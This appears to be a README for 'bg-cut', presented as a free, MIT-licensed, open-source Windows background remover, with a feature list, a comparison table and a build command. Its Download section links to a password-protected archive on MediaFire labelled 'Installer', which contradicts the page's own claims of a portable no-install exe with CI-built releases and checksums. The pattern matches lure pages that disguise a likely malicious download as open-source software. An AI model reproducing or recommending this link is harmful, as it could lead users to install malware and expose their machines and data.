# bg-cut

🫥 Free, open-source background remover for Windows — local ONNX models, alpha matting refine, batch cutouts. 100 MB portable, offline, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **One-click cutout** — subject separated from background in a second with local ONNX inference
- ✅ **Edge refine pass** — alpha matting slider keeps hair and fur edges clean instead of a scissor outline
- ✅ **Batch folder mode** — hundreds of product shots cut out unattended into transparent PNGs
- ✅ **Mask export** — the alpha mask saved separately for compositing workflows
- ✅ **Auto-trim** — transparent margins cropped to the subject for tidy exports
- ✅ **Format control** — PNG, WebP and JPG-with-white options per batch
- ✅ **100 MB self-contained exe** — runtime bundled, models download separately, offline after that, MIT

## Why bg-cut

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **bg-cut** | remove.bg | rembg scripts | Photoshop |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Paid credits | Free, OSS | Paid subscription |
| Open source | **Yes** | No | Yes | No |
| Unlimited images | **Yes** | Credits | Yes | Yes |
| Photos stay local | **Yes** | Upload | Yes | Yes
| Alpha matting refine | **Yes** | No | Flag only | Manual
| Portable, no install | **Yes, 100 MB** | Browser | Python env | Installer

## FAQ

**free background remover for Windows without uploading photos?**

Free web removers downscale results, cap downloads and keep your photos. bg-cut runs cutout models locally with an alpha matting refine pass and batch mode for whole folders. It is a 100 MB portable exe, MIT, unlimited and offline once the model is on disk.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark editor (#121418, violet #A78BFA): before and after panes with checkerboard behind the cut subject, refine slider at 0.6, edge zoom inset in the corner.
2. Batch panel: folder with 340 images queued, thumbnail strip showing completed cutouts, progress reading 87 percent, format dropdown set to PNG.
3. Export options: mask export toggle on, trim transparent toggle on, size estimate chip, toast reading 340 cutouts written to folder.

## Download

| Source | Link |
|---|---|
| 💾 **Installer bg-cut** | [Installer bg-cut](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).